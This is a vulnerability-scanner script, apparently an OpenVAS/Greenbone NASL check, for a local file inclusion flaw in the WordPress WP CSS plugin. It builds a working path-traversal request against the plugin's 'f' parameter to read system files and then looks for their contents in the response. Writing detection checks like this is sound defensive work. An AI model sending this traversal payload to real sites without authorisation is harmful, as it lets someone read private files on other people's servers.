CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902723" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-08-26 14:59:42 +0200 (Fri, 26 Aug 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "WordPress 'WP CSS' Plugin Local File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45734" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/104467/wpyoast-disclose.txt" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "WordPress WP CSS plugin version 2.0.5" );
	script_tag( name: "insight", value: "The flaw is due to input validation error in 'f' parameter
  to 'wp-content/plugins/wp-css/wp-css-compress.php', which allows attackers
  to read arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running with WordPress WP CSS Plugin and is prone to
  local file inclusion vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = NASLString( dir, "/wp-content/plugins/wp-css/wp-css-compress.php?f=", crap( data: "..%2f", length: 3 * 15 ), file );
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

